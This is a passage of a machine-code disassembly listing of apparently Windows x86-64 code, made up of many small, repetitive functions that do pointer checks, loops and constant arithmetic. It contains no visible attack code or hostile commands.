   14000275a:	7e 2d                	jle    0x140002789
   14000275c:	c7 44 24 10 0a 00 00 	movl   $0xa,0x10(%rsp)
   140002763:	00 
   140002764:	83 7c 24 10 00       	cmpl   $0x0,0x10(%rsp)
   140002769:	7e 17                	jle    0x140002782
   14000276b:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   14000276f:	33 44 24 10          	xor    0x10(%rsp),%eax
   140002773:	33 44 24 08          	xor    0x8(%rsp),%eax
   140002777:	89 44 24 0c          	mov    %eax,0xc(%rsp)
   14000277b:	83 6c 24 10 01       	subl   $0x1,0x10(%rsp)
   140002780:	eb e2                	jmp    0x140002764
   140002782:	83 6c 24 08 01       	subl   $0x1,0x8(%rsp)
   140002787:	eb cc                	jmp    0x140002755
   140002789:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   14000278d:	48 83 c4 28          	add    $0x28,%rsp
   140002791:	c3                   	ret
   140002792:	48 83 ec 28          	sub    $0x28,%rsp
   140002796:	31 c9                	xor    %ecx,%ecx
   140002798:	ff 15 2e 9e d6 05    	call   *0x5d69e2e(%rip)        # 0x145d6c5cc
   14000279e:	48 85 c0             	test   %rax,%rax
   1400027a1:	74 05                	je     0x1400027a8
   1400027a3:	48 83 c4 28          	add    $0x28,%rsp
   1400027a7:	c3                   	ret
   1400027a8:	83 c8 ff             	or     $0xffffffff,%eax
   1400027ab:	48 83 c4 28          	add    $0x28,%rsp
   1400027af:	c3                   	ret
   1400027b0:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   1400027b7:	73 07                	jae    0x1400027c0
   1400027b9:	48 8d 0d 57 21 00 00 	lea    0x2157(%rip),%rcx        # 0x140004917
   1400027c0:	31 c0                	xor    %eax,%eax
   1400027c2:	41 ba 00 01 00 00    	mov    $0x100,%r10d
   1400027c8:	45 85 d2             	test   %r10d,%r10d
   1400027cb:	74 1a                	je     0x1400027e7
   1400027cd:	41 83 ea 01          	sub    $0x1,%r10d
   1400027d1:	0f b7 11             	movzwl (%rcx),%edx
   1400027d4:	66 85 d2             	test   %dx,%dx
   1400027d7:	74 0e                	je     0x1400027e7
   1400027d9:	66 83 fa 5c          	cmp    $0x5c,%dx
   1400027dd:	75 02                	jne    0x1400027e1
   1400027df:	ff c0                	inc    %eax
   1400027e1:	48 83 c1 02          	add    $0x2,%rcx
   1400027e5:	eb e1                	jmp    0x1400027c8
   1400027e7:	c3                   	ret
   1400027e8:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   1400027ef:	72 25                	jb     0x140002816
   1400027f1:	48 81 fa 00 00 01 00 	cmp    $0x10000,%rdx
   1400027f8:	72 1c                	jb     0x140002816
   1400027fa:	44 0f b6 01          	movzbl (%rcx),%r8d
   1400027fe:	44 0f b6 0a          	movzbl (%rdx),%r9d
   140002802:	45 38 c8             	cmp    %r9b,%r8b
   140002805:	7c 05                	jl     0x14000280c
   140002807:	7f 07                	jg     0x140002810
   140002809:	31 c0                	xor    %eax,%eax
   14000280b:	c3                   	ret
   14000280c:	83 c8 ff             	or     $0xffffffff,%eax
   14000280f:	c3                   	ret
   140002810:	b8 01 00 00 00       	mov    $0x1,%eax
   140002815:	c3                   	ret
   140002816:	b8 57 00 07 80       	mov    $0x80070057,%eax
   14000281b:	c3                   	ret
   14000281c:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140002823:	72 4e                	jb     0x140002873
   140002825:	48 83 ec 28          	sub    $0x28,%rsp
   140002829:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%rsp)
   140002830:	00 
   140002831:	48 8d 4c 24 08       	lea    0x8(%rsp),%rcx
   140002836:	48 8d 54 24 18       	lea    0x18(%rsp),%rdx
   14000283b:	e8 6e fd ff ff       	call   0x1400025ae
   140002840:	01 44 24 08          	add    %eax,0x8(%rsp)
   140002844:	48 8d 4c 24 18       	lea    0x18(%rsp),%rcx
   140002849:	48 8d 54 24 18       	lea    0x18(%rsp),%rdx
   14000284e:	e8 b3 fd ff ff       	call   0x140002606
   140002853:	01 44 24 08          	add    %eax,0x8(%rsp)
   140002857:	48 8d 4c 24 08       	lea    0x8(%rsp),%rcx
   14000285c:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140002861:	e8 d5 fe ff ff       	call   0x14000273b
   140002866:	01 44 24 08          	add    %eax,0x8(%rsp)
   14000286a:	8b 44 24 08          	mov    0x8(%rsp),%eax
   14000286e:	48 83 c4 28          	add    $0x28,%rsp
   140002872:	c3                   	ret
   140002873:	83 c8 ff             	or     $0xffffffff,%eax
   140002876:	c3                   	ret
   140002877:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   14000287e:	72 4e                	jb     0x1400028ce
   140002880:	48 83 ec 28          	sub    $0x28,%rsp
   140002884:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%rsp)
   14000288b:	00 
   14000288c:	48 8d 4c 24 10       	lea    0x10(%rsp),%rcx
   140002891:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140002896:	e8 4f fe ff ff       	call   0x1400026ea
   14000289b:	01 44 24 08          	add    %eax,0x8(%rsp)
   14000289f:	48 8d 4c 24 10       	lea    0x10(%rsp),%rcx
   1400028a4:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400028a9:	e8 02 ff ff ff       	call   0x1400027b0
   1400028ae:	01 44 24 08          	add    %eax,0x8(%rsp)
   1400028b2:	48 8d 4c 24 08       	lea    0x8(%rsp),%rcx
   1400028b7:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400028bc:	e8 46 fe ff ff       	call   0x140002707
   1400028c1:	31 44 24 08          	xor    %eax,0x8(%rsp)
   1400028c5:	8b 44 24 08          	mov    0x8(%rsp),%eax
   1400028c9:	48 83 c4 28          	add    $0x28,%rsp
   1400028cd:	c3                   	ret
   1400028ce:	83 c8 ff             	or     $0xffffffff,%eax
   1400028d1:	c3                   	ret
   1400028d2:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   1400028d9:	72 3b                	jb     0x140002916
   1400028db:	48 83 ec 28          	sub    $0x28,%rsp
   1400028df:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%rsp)
   1400028e6:	00 
   1400028e7:	48 8d 4c 24 08       	lea    0x8(%rsp),%rcx
   1400028ec:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   1400028f1:	e8 b8 fc ff ff       	call   0x1400025ae
   1400028f6:	01 44 24 08          	add    %eax,0x8(%rsp)
   1400028fa:	48 8d 4c 24 08       	lea    0x8(%rsp),%rcx
   1400028ff:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140002904:	e8 a7 fe ff ff       	call   0x1400027b0
   140002909:	01 44 24 08          	add    %eax,0x8(%rsp)
   14000290d:	8b 44 24 08          	mov    0x8(%rsp),%eax
   140002911:	48 83 c4 28          	add    $0x28,%rsp
   140002915:	c3                   	ret
   140002916:	83 c8 ff             	or     $0xffffffff,%eax
   140002919:	c3                   	ret
   14000291a:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140002921:	72 14                	jb     0x140002937
   140002923:	0f b6 01             	movzbl (%rcx),%eax
   140002926:	35 b6 c2 9c 00       	xor    $0x9cc2b6,%eax
   14000292b:	69 c0 c2 00 00 00    	imul   $0xc2,%eax,%eax
   140002931:	35 07 53 49 00       	xor    $0x495307,%eax
   140002936:	c3                   	ret
   140002937:	b8 05 40 00 80       	mov    $0x80004005,%eax
   14000293c:	c3                   	ret
   14000293d:	89 c8                	mov    %ecx,%eax
   14000293f:	c1 e8 10             	shr    $0x10,%eax
   140002942:	25 ff 00 00 00       	and    $0xff,%eax
   140002947:	83 f8 5d             	cmp    $0x5d,%eax
   14000294a:	75 06                	jne    0x140002952
   14000294c:	0d 00 00 00 80       	or     $0x80000000,%eax
   140002951:	c3                   	ret
   140002952:	83 e0 7f             	and    $0x7f,%eax
   140002955:	c3                   	ret
   140002956:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   14000295d:	72 12                	jb     0x140002971
   14000295f:	0f b6 01             	movzbl (%rcx),%eax
   140002962:	6b c0 4b             	imul   $0x4b,%eax,%eax
   140002965:	35 7d be 86 00       	xor    $0x86be7d,%eax
   14000296a:	69 c0 c8 00 00 00    	imul   $0xc8,%eax,%eax
   140002970:	c3                   	ret
   140002971:	b8 57 00 07 80       	mov    $0x80070057,%eax
   140002976:	c3                   	ret
   140002977:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   14000297e:	72 23                	jb     0x1400029a3
   140002980:	48 81 fa 00 00 01 00 	cmp    $0x10000,%rdx
   140002987:	72 1a                	jb     0x1400029a3
   140002989:	44 8b 01             	mov    (%rcx),%r8d
   14000298c:	44 8b 0a             	mov    (%rdx),%r9d
   14000298f:	45 39 c8             	cmp    %r9d,%r8d
   140002992:	7c 05                	jl     0x140002999
   140002994:	7f 07                	jg     0x14000299d
   140002996:	31 c0                	xor    %eax,%eax
   140002998:	c3                   	ret
   140002999:	83 c8 ff             	or     $0xffffffff,%eax
   14000299c:	c3                   	ret
   14000299d:	b8 01 00 00 00       	mov    $0x1,%eax
   1400029a2:	c3                   	ret
   1400029a3:	b8 57 00 07 80       	mov    $0x80070057,%eax
   1400029a8:	c3                   	ret
   1400029a9:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   1400029b0:	72 07                	jb     0x1400029b9
   1400029b2:	0f b6 01             	movzbl (%rcx),%eax
   1400029b5:	6b c0 78             	imul   $0x78,%eax,%eax
   1400029b8:	c3                   	ret
   1400029b9:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   1400029be:	c3                   	ret
   1400029bf:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   1400029c6:	72 26                	jb     0x1400029ee
   1400029c8:	48 81 fa 00 00 01 00 	cmp    $0x10000,%rdx
   1400029cf:	72 1d                	jb     0x1400029ee
   1400029d1:	44 0f b7 01          	movzwl (%rcx),%r8d
   1400029d5:	44 0f b7 0a          	movzwl (%rdx),%r9d
   1400029d9:	66 45 39 c8          	cmp    %r9w,%r8w
   1400029dd:	7c 05                	jl     0x1400029e4
   1400029df:	7f 07                	jg     0x1400029e8
   1400029e1:	31 c0                	xor    %eax,%eax
   1400029e3:	c3                   	ret
   1400029e4:	83 c8 ff             	or     $0xffffffff,%eax
   1400029e7:	c3                   	ret
   1400029e8:	b8 01 00 00 00       	mov    $0x1,%eax
   1400029ed:	c3                   	ret
   1400029ee:	b8 57 00 07 80       	mov    $0x80070057,%eax
   1400029f3:	c3                   	ret
   1400029f4:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   1400029fb:	72 0e                	jb     0x140002a0b
   1400029fd:	0f b7 01             	movzwl (%rcx),%eax
   140002a00:	25 95 b0 ba 00       	and    $0xbab095,%eax
   140002a05:	35 20 d4 1a 00       	xor    $0x1ad420,%eax
   140002a0a:	c3                   	ret
   140002a0b:	83 c8 ff             	or     $0xffffffff,%eax
   140002a0e:	c3                   	ret
   140002a0f:	48 83 ec 28          	sub    $0x28,%rsp
   140002a13:	85 c9                	test   %ecx,%ecx
   140002a15:	74 46                	je     0x140002a5d
   140002a17:	81 e1 ff 00 00 00    	and    $0xff,%ecx
   140002a1d:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   140002a21:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%rsp)
   140002a28:	00 
   140002a29:	83 7c 24 08 00       	cmpl   $0x0,0x8(%rsp)
   140002a2e:	7e 2d                	jle    0x140002a5d
   140002a30:	c7 44 24 10 0b 00 00 	movl   $0xb,0x10(%rsp)
   140002a37:	00 
   140002a38:	83 7c 24 10 00       	cmpl   $0x0,0x10(%rsp)
   140002a3d:	7e 17                	jle    0x140002a56
   140002a3f:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   140002a43:	03 44 24 10          	add    0x10(%rsp),%eax
   140002a47:	03 44 24 08          	add    0x8(%rsp),%eax
   140002a4b:	89 44 24 0c          	mov    %eax,0xc(%rsp)
   140002a4f:	83 6c 24 10 01       	subl   $0x1,0x10(%rsp)
   140002a54:	eb e2                	jmp    0x140002a38
   140002a56:	83 6c 24 08 01       	subl   $0x1,0x8(%rsp)
   140002a5b:	eb cc                	jmp    0x140002a29
   140002a5d:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   140002a61:	48 83 c4 28          	add    $0x28,%rsp
   140002a65:	c3                   	ret
   140002a66:	89 c8                	mov    %ecx,%eax
   140002a68:	c1 e8 10             	shr    $0x10,%eax
   140002a6b:	25 ff ff 00 00       	and    $0xffff,%eax
   140002a70:	3d 1c e1 00 00       	cmp    $0xe11c,%eax
   140002a75:	75 06                	jne    0x140002a7d
   140002a77:	0d 00 00 00 40       	or     $0x40000000,%eax
   140002a7c:	c3                   	ret
   140002a7d:	25 ff 7f 00 00       	and    $0x7fff,%eax
   140002a82:	c3                   	ret
   140002a83:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140002a8a:	72 26                	jb     0x140002ab2
   140002a8c:	48 81 fa 00 00 01 00 	cmp    $0x10000,%rdx
   140002a93:	72 1d                	jb     0x140002ab2
   140002a95:	44 0f b7 01          	movzwl (%rcx),%r8d
   140002a99:	44 0f b7 0a          	movzwl (%rdx),%r9d
   140002a9d:	66 45 39 c8          	cmp    %r9w,%r8w
   140002aa1:	7c 05                	jl     0x140002aa8
   140002aa3:	7f 07                	jg     0x140002aac
   140002aa5:	31 c0                	xor    %eax,%eax
   140002aa7:	c3                   	ret
   140002aa8:	83 c8 ff             	or     $0xffffffff,%eax
   140002aab:	c3                   	ret
   140002aac:	b8 01 00 00 00       	mov    $0x1,%eax
   140002ab1:	c3                   	ret
   140002ab2:	b8 57 00 07 80       	mov    $0x80070057,%eax
   140002ab7:	c3                   	ret
   140002ab8:	89 c8                	mov    %ecx,%eax
   140002aba:	c1 e8 14             	shr    $0x14,%eax
   140002abd:	83 e0 0f             	and    $0xf,%eax
   140002ac0:	83 f8 04             	cmp    $0x4,%eax
   140002ac3:	75 06                	jne    0x140002acb
   140002ac5:	0d 00 00 00 80       	or     $0x80000000,%eax
   140002aca:	c3                   	ret
   140002acb:	83 e0 07             	and    $0x7,%eax
   140002ace:	c3                   	ret
   140002acf:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140002ad6:	73 07                	jae    0x140002adf
   140002ad8:	48 8d 0d 42 24 00 00 	lea    0x2442(%rip),%rcx        # 0x140004f21
   140002adf:	31 c0                	xor    %eax,%eax
   140002ae1:	41 ba 00 01 00 00    	mov    $0x100,%r10d
   140002ae7:	45 85 d2             	test   %r10d,%r10d
   140002aea:	74 17                	je     0x140002b03
   140002aec:	41 83 ea 01          	sub    $0x1,%r10d
   140002af0:	0f b6 11             	movzbl (%rcx),%edx
   140002af3:	84 d2                	test   %dl,%dl
   140002af5:	74 0c                	je     0x140002b03
   140002af7:	80 fa 20             	cmp    $0x20,%dl
   140002afa:	75 02                	jne    0x140002afe
   140002afc:	ff c0                	inc    %eax
   140002afe:	48 ff c1             	inc    %rcx
   140002b01:	eb e4                	jmp    0x140002ae7
   140002b03:	c3                   	ret
   140002b04:	48 83 ec 28          	sub    $0x28,%rsp
   140002b08:	85 c9                	test   %ecx,%ecx
   140002b0a:	74 47                	je     0x140002b53
   140002b0c:	81 e1 ff 00 00 00    	and    $0xff,%ecx
   140002b12:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   140002b16:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%rsp)
   140002b1d:	00 
   140002b1e:	83 7c 24 08 00       	cmpl   $0x0,0x8(%rsp)
   140002b23:	7e 2e                	jle    0x140002b53
   140002b25:	c7 44 24 10 08 00 00 	movl   $0x8,0x10(%rsp)
   140002b2c:	00 
   140002b2d:	83 7c 24 10 00       	cmpl   $0x0,0x10(%rsp)
   140002b32:	7e 18                	jle    0x140002b4c
   140002b34:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   140002b38:	0f af 44 24 10       	imul   0x10(%rsp),%eax
   140002b3d:	03 44 24 08          	add    0x8(%rsp),%eax
   140002b41:	89 44 24 0c          	mov    %eax,0xc(%rsp)
   140002b45:	83 6c 24 10 01       	subl   $0x1,0x10(%rsp)
   140002b4a:	eb e1                	jmp    0x140002b2d
   140002b4c:	83 6c 24 08 01       	subl   $0x1,0x8(%rsp)
   140002b51:	eb cb                	jmp    0x140002b1e
   140002b53:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   140002b57:	48 83 c4 28          	add    $0x28,%rsp
   140002b5b:	c3                   	ret
   140002b5c:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140002b63:	72 3b                	jb     0x140002ba0
   140002b65:	48 83 ec 28          	sub    $0x28,%rsp
   140002b69:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%rsp)
   140002b70:	00 
   140002b71:	48 8d 4c 24 08       	lea    0x8(%rsp),%rcx
   140002b76:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140002b7b:	e8 29 fe ff ff       	call   0x1400029a9
   140002b80:	01 44 24 08          	add    %eax,0x8(%rsp)
   140002b84:	48 8d 4c 24 18       	lea    0x18(%rsp),%rcx
   140002b89:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140002b8e:	e8 7c fe ff ff       	call   0x140002a0f
   140002b93:	31 44 24 08          	xor    %eax,0x8(%rsp)
   140002b97:	8b 44 24 08          	mov    0x8(%rsp),%eax
   140002b9b:	48 83 c4 28          	add    $0x28,%rsp
   140002b9f:	c3                   	ret
   140002ba0:	83 c8 ff             	or     $0xffffffff,%eax
   140002ba3:	c3                   	ret
   140002ba4:	48 83 ec 28          	sub    $0x28,%rsp
   140002ba8:	85 c9                	test   %ecx,%ecx
   140002baa:	74 46                	je     0x140002bf2
   140002bac:	81 e1 ff 00 00 00    	and    $0xff,%ecx
   140002bb2:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   140002bb6:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%rsp)
   140002bbd:	00 
   140002bbe:	83 7c 24 08 00       	cmpl   $0x0,0x8(%rsp)
   140002bc3:	7e 2d                	jle    0x140002bf2
   140002bc5:	c7 44 24 10 03 00 00 	movl   $0x3,0x10(%rsp)
   140002bcc:	00 
   140002bcd:	83 7c 24 10 00       	cmpl   $0x0,0x10(%rsp)
   140002bd2:	7e 17                	jle    0x140002beb
   140002bd4:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   140002bd8:	03 44 24 10          	add    0x10(%rsp),%eax
   140002bdc:	03 44 24 08          	add    0x8(%rsp),%eax
   140002be0:	89 44 24 0c          	mov    %eax,0xc(%rsp)
   140002be4:	83 6c 24 10 01       	subl   $0x1,0x10(%rsp)
   140002be9:	eb e2                	jmp    0x140002bcd
   140002beb:	83 6c 24 08 01       	subl   $0x1,0x8(%rsp)
   140002bf0:	eb cc                	jmp    0x140002bbe
   140002bf2:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   140002bf6:	48 83 c4 28          	add    $0x28,%rsp
   140002bfa:	c3                   	ret
   140002bfb:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140002c02:	72 4e                	jb     0x140002c52
   140002c04:	48 83 ec 28          	sub    $0x28,%rsp
   140002c08:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%rsp)
   140002c0f:	00 
   140002c10:	48 8d 4c 24 10       	lea    0x10(%rsp),%rcx
   140002c15:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140002c1a:	e8 47 fe ff ff       	call   0x140002a66
   140002c1f:	31 44 24 08          	xor    %eax,0x8(%rsp)
   140002c23:	48 8d 4c 24 10       	lea    0x10(%rsp),%rcx
   140002c28:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140002c2d:	e8 9d fe ff ff       	call   0x140002acf
   140002c32:	31 44 24 08          	xor    %eax,0x8(%rsp)
   140002c36:	48 8d 4c 24 18       	lea    0x18(%rsp),%rcx
   140002c3b:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140002c40:	e8 32 fd ff ff       	call   0x140002977
   140002c45:	31 44 24 08          	xor    %eax,0x8(%rsp)
   140002c49:	8b 44 24 08          	mov    0x8(%rsp),%eax
   140002c4d:	48 83 c4 28          	add    $0x28,%rsp
   140002c51:	c3                   	ret
   140002c52:	83 c8 ff             	or     $0xffffffff,%eax
   140002c55:	c3                   	ret
   140002c56:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140002c5d:	72 3b                	jb     0x140002c9a
   140002c5f:	48 83 ec 28          	sub    $0x28,%rsp
   140002c63:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%rsp)
   140002c6a:	00 
   140002c6b:	48 8d 4c 24 10       	lea    0x10(%rsp),%rcx
   140002c70:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140002c75:	e8 09 fe ff ff       	call   0x140002a83
   140002c7a:	31 44 24 08          	xor    %eax,0x8(%rsp)
   140002c7e:	48 8d 4c 24 10       	lea    0x10(%rsp),%rcx
   140002c83:	48 8d 54 24 18       	lea    0x18(%rsp),%rdx
   140002c88:	e8 2b fe ff ff       	call   0x140002ab8
   140002c8d:	01 44 24 08          	add    %eax,0x8(%rsp)
   140002c91:	8b 44 24 08          	mov    0x8(%rsp),%eax
   140002c95:	48 83 c4 28          	add    $0x28,%rsp
   140002c99:	c3                   	ret
   140002c9a:	83 c8 ff             	or     $0xffffffff,%eax
   140002c9d:	c3                   	ret
   140002c9e:	48 83 ec 28          	sub    $0x28,%rsp
   140002ca2:	31 c9                	xor    %ecx,%ecx
   140002ca4:	ff 15 22 99 d6 05    	call   *0x5d69922(%rip)        # 0x145d6c5cc
   140002caa:	48 85 c0             	test   %rax,%rax
   140002cad:	74 0a                	je     0x140002cb9
   140002caf:	25 ff ff 00 00       	and    $0xffff,%eax
   140002cb4:	48 83 c4 28          	add    $0x28,%rsp
   140002cb8:	c3                   	ret
   140002cb9:	83 c8 ff             	or     $0xffffffff,%eax
   140002cbc:	48 83 c4 28          	add    $0x28,%rsp
   140002cc0:	c3                   	ret
   140002cc1:	48 83 ec 28          	sub    $0x28,%rsp
   140002cc5:	31 c9                	xor    %ecx,%ecx
   140002cc7:	ff 15 ff 98 d6 05    	call   *0x5d698ff(%rip)        # 0x145d6c5cc
   140002ccd:	48 85 c0             	test   %rax,%rax
   140002cd0:	74 0a                	je     0x140002cdc
   140002cd2:	25 ff ff 00 00       	and    $0xffff,%eax
   140002cd7:	48 83 c4 28          	add    $0x28,%rsp
   140002cdb:	c3                   	ret
   140002cdc:	83 c8 ff             	or     $0xffffffff,%eax
   140002cdf:	48 83 c4 28          	add    $0x28,%rsp
   140002ce3:	c3                   	ret
   140002ce4:	48 83 ec 28          	sub    $0x28,%rsp
   140002ce8:	85 c9                	test   %ecx,%ecx
   140002cea:	74 46                	je     0x140002d32
   140002cec:	81 e1 ff 00 00 00    	and    $0xff,%ecx
   140002cf2:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   140002cf6:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%rsp)
   140002cfd:	00 
   140002cfe:	83 7c 24 08 00       	cmpl   $0x0,0x8(%rsp)
   140002d03:	7e 2d                	jle    0x140002d32
   140002d05:	c7 44 24 10 0a 00 00 	movl   $0xa,0x10(%rsp)
   140002d0c:	00 
   140002d0d:	83 7c 24 10 00       	cmpl   $0x0,0x10(%rsp)
   140002d12:	7e 17                	jle    0x140002d2b
   140002d14:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   140002d18:	03 44 24 10          	add    0x10(%rsp),%eax
   140002d1c:	03 44 24 08          	add    0x8(%rsp),%eax
   140002d20:	89 44 24 0c          	mov    %eax,0xc(%rsp)
   140002d24:	83 6c 24 10 01       	subl   $0x1,0x10(%rsp)
   140002d29:	eb e2                	jmp    0x140002d0d
   140002d2b:	83 6c 24 08 01       	subl   $0x1,0x8(%rsp)
   140002d30:	eb cc                	jmp    0x140002cfe
   140002d32:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   140002d36:	48 83 c4 28          	add    $0x28,%rsp
   140002d3a:	c3                   	ret
   140002d3b:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140002d42:	72 4e                	jb     0x140002d92
   140002d44:	48 83 ec 28          	sub    $0x28,%rsp
   140002d48:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%rsp)
   140002d4f:	00 
   140002d50:	48 8d 4c 24 08       	lea    0x8(%rsp),%rcx
   140002d55:	48 8d 54 24 18       	lea    0x18(%rsp),%rdx
   140002d5a:	e8 a5 fd ff ff       	call   0x140002b04
   140002d5f:	01 44 24 08          	add    %eax,0x8(%rsp)
   140002d63:	48 8d 4c 24 10       	lea    0x10(%rsp),%rcx
   140002d68:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140002d6d:	e8 11 fd ff ff       	call   0x140002a83
   140002d72:	01 44 24 08          	add    %eax,0x8(%rsp)
   140002d76:	48 8d 4c 24 08       	lea    0x8(%rsp),%rcx
   140002d7b:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140002d80:	e8 5f ff ff ff       	call   0x140002ce4
   140002d85:	31 44 24 08          	xor    %eax,0x8(%rsp)
   140002d89:	8b 44 24 08          	mov    0x8(%rsp),%eax
   140002d8d:	48 83 c4 28          	add    $0x28,%rsp
   140002d91:	c3                   	ret
   140002d92:	83 c8 ff             	or     $0xffffffff,%eax
   140002d95:	c3                   	ret
   140002d96:	48 83 ec 28          	sub    $0x28,%rsp
   140002d9a:	85 c9                	test   %ecx,%ecx
   140002d9c:	74 46                	je     0x140002de4
   140002d9e:	81 e1 ff 00 00 00    	and    $0xff,%ecx
   140002da4:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   140002da8:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%rsp)
   140002daf:	00 
   140002db0:	83 7c 24 08 00       	cmpl   $0x0,0x8(%rsp)
   140002db5:	7e 2d                	jle    0x140002de4
   140002db7:	c7 44 24 10 08 00 00 	movl   $0x8,0x10(%rsp)
   140002dbe:	00 
   140002dbf:	83 7c 24 10 00       	cmpl   $0x0,0x10(%rsp)
   140002dc4:	7e 17                	jle    0x140002ddd
   140002dc6:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   140002dca:	03 44 24 10          	add    0x10(%rsp),%eax
   140002dce:	03 44 24 08          	add    0x8(%rsp),%eax
   140002dd2:	89 44 24 0c          	mov    %eax,0xc(%rsp)
   140002dd6:	83 6c 24 10 01       	subl   $0x1,0x10(%rsp)
   140002ddb:	eb e2                	jmp    0x140002dbf
   140002ddd:	83 6c 24 08 01       	subl   $0x1,0x8(%rsp)
   140002de2:	eb cc                	jmp    0x140002db0
   140002de4:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   140002de8:	48 83 c4 28          	add    $0x28,%rsp
   140002dec:	c3                   	ret
   140002ded:	48 83 ec 28          	sub    $0x28,%rsp
   140002df1:	85 c9                	test   %ecx,%ecx
   140002df3:	74 47                	je     0x140002e3c
   140002df5:	81 e1 ff 00 00 00    	and    $0xff,%ecx
   140002dfb:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   140002dff:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%rsp)
   140002e06:	00 
   140002e07:	83 7c 24 08 00       	cmpl   $0x0,0x8(%rsp)
   140002e0c:	7e 2e                	jle    0x140002e3c
   140002e0e:	c7 44 24 10 09 00 00 	movl   $0x9,0x10(%rsp)
   140002e15:	00 
   140002e16:	83 7c 24 10 00       	cmpl   $0x0,0x10(%rsp)
   140002e1b:	7e 18                	jle    0x140002e35
   140002e1d:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   140002e21:	0f af 44 24 10       	imul   0x10(%rsp),%eax
   140002e26:	03 44 24 08          	add    0x8(%rsp),%eax
   140002e2a:	89 44 24 0c          	mov    %eax,0xc(%rsp)
   140002e2e:	83 6c 24 10 01       	subl   $0x1,0x10(%rsp)
   140002e33:	eb e1                	jmp    0x140002e16
   140002e35:	83 6c 24 08 01       	subl   $0x1,0x8(%rsp)
   140002e3a:	eb cb                	jmp    0x140002e07
   140002e3c:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   140002e40:	48 83 c4 28          	add    $0x28,%rsp
   140002e44:	c3                   	ret
   140002e45:	89 c8                	mov    %ecx,%eax
   140002e47:	c1 e8 18             	shr    $0x18,%eax
   140002e4a:	25 ff 0f 00 00       	and    $0xfff,%eax
   140002e4f:	3d d8 0a 00 00       	cmp    $0xad8,%eax
   140002e54:	75 06                	jne    0x140002e5c
   140002e56:	0d 00 00 00 40       	or     $0x40000000,%eax
   140002e5b:	c3                   	ret
   140002e5c:	25 ff 07 00 00       	and    $0x7ff,%eax
   140002e61:	c3                   	ret
   140002e62:	48 83 ec 28          	sub    $0x28,%rsp
   140002e66:	85 c9                	test   %ecx,%ecx
   140002e68:	74 46                	je     0x140002eb0
   140002e6a:	81 e1 ff 00 00 00    	and    $0xff,%ecx
   140002e70:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   140002e74:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%rsp)
   140002e7b:	00 
   140002e7c:	83 7c 24 08 00       	cmpl   $0x0,0x8(%rsp)
   140002e81:	7e 2d                	jle    0x140002eb0
   140002e83:	c7 44 24 10 06 00 00 	movl   $0x6,0x10(%rsp)
   140002e8a:	00 
   140002e8b:	83 7c 24 10 00       	cmpl   $0x0,0x10(%rsp)
   140002e90:	7e 17                	jle    0x140002ea9
   140002e92:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   140002e96:	03 44 24 10          	add    0x10(%rsp),%eax
